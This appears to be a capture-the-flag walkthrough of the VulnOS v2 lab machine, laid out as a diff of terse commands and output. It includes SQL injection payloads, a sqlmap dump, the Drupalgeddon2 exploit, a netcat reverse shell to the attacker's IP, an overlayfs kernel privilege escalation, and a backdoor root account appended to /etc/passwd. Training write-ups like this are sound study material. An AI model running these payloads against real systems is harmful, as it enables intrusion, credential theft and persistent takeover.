@@ -1,0 +1,122 @@
+# 1st way to get a shell
+http://10.0.0.177/jabcd0cs/
+guest:guest
+OpenDocMan v1.2.7
+
+searchsploit opendoc
+http://10.0.0.177/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9
+
+ UNION SELECT 1,user(),3,4,5,6,7,8,9
+# list databases
+ UNION SELECT 1,schema_name,3,4,5,6,7,8,9 FROM information_schema.schemata
+# see select options in HTML source
+database: jabcd0cs
+
+ UNION SELECT 1,column_name,3,4,5,6,7,8,9 FROM information_schema.columns WHERE schema_name='jabcd0cs'
+
+# paginate columns for all tables
+for i in $(seq 0 50); do curl -s "10.0.0.177/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,column_name,3,4,5,6,7,8,9%20FROM%20inform
+ation_schema.columns%20LIMIT%20$i,1"|grep option; done
+
+# list site users and passwords
+ UNION SELECT 1,username,3,4,5,6,7,8,9 FROM jabcd0cs.odm_user
+ UNION SELECT 1,password,3,4,5,6,7,8,9 FROM jabcd0cs.odm_user
+
+http://10.0.0.177/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,username,3,4,5,6,7,8,9%20FROM%20jabcd0cs.odm_user
+http://10.0.0.177/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,password,3,4,5,6,7,8,9%20FROM%20jabcd0cs.odm_user
+webmin</option><option value=2 >guest</option><option value=1 selected>b78aae356709f8c31118ea613980954b</option><option value=1 selected>084e0343a0486ff05530df6c705c8bb4
+
+guest:084e0343a0486ff05530df6c705c8bb4
+echo -n "guest" | md5sum
+084e0343a0486ff05530df6c705c8bb4
+
+webmin:b78aae356709f8c31118ea613980954b
+b78aae356709f8c31118ea613980954b:webmin1980
+
+webmin:webmin1980
+
+# sqlmap do all that work
+sqlmap --batch -u "http://10.0.0.177/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -p add_value --dbs --dbms=mysql --dump
+webmin   | min       | b78aae356709f8c31118ea613980954b
+
+ssh webmin@10.0.0.177
+
+# 2nd way to get a shell
+searchsploit drupal
+Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution  | exploits/php/webapps/44449.rb
+
+ruby 44449.rb http://10.0.0.177/jabc/
+
+# get shell with
+http://10.0.0.177/jabc/shell.php?c=nc%20-e%20/bin/sh%2010.0.0.148%20443
+
+less sites/default/dbconfig.php
+'driver' => 'mysql',
+'database' => 'drupal7',
+'username' => 'drupal7',
+'password' => 'toor',
+'host' => 'localhost',
+
+mysql -u drupal7 -p
+mysql> select * from users;
+webmin | $S$DPc41p2JwLXR6vgPCi.jC7WnRMkw3Zge3pVoJFnOn6gfMfsOr/Ug
+
+MODE: 7900
+TYPE: Drupal7
+HASH: $S$.......
+
+hashcat --force -a 0 -m 7900 webmin-hash /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt
+# nothing :(
+
+psql -U postgres -h localhost
+# postgres as password
+postgres=# \l
+postgres=# \connect system
+system=# \dt
+system=# select * from users;
+ ID |  username   |    password     
+----+-------------+-----------------
+  1 | vulnosadmin | c4nuh4ckm3tw1c3
+
+ssh vulnosadmin@10.0.0.177
+
+Linux version 3.13.0-24-generic
+
+bash linux-exploit-suggester.sh
+# tried cow versions and didn't work
+[+] [CVE-2015-1328] overlayfs
+
+   Details: http://seclists.org/oss-sec/2015/q2/717
+   Exposure: highly probable
+   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
+   Download URL: https://www.exploit-db.com/download/37292
+
+wget https://www.exploit-db.com/download/37292
+vulnosadmin@VulnOSv2:~$ mv 37292 fs.c
+vulnosadmin@VulnOSv2:~$ vim fs.c 
+vulnosadmin@VulnOSv2:~$ gcc fs.c -o ofs                                                       
+vulnosadmin@VulnOSv2:~$ ls
+fs.c  linux-exploit-suggester.sh  ofs  r00t.blend  ?x@@@8???@@???H1?jiX??j
+vulnosadmin@VulnOSv2:~$ less fs.c 
+vulnosadmin@VulnOSv2:~$ ./ofs
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(vulnosadmin)
+# echo "pozo:xxg71OIase7TQ:0:0:pozo:/root:/bin/bash" >> /etc/passwd
+
+ssh pozo@10.0.0.177
+# password: pozo
+
+root@VulnOSv2:~# cd /root
+root@VulnOSv2:~# cat flag.txt 
+Hello and welcome.
+You successfully compromised the company "JABC" and the server completely !!
+Congratulations !!!
+Hope you enjoyed it.
+
+What do you think of A.I.?
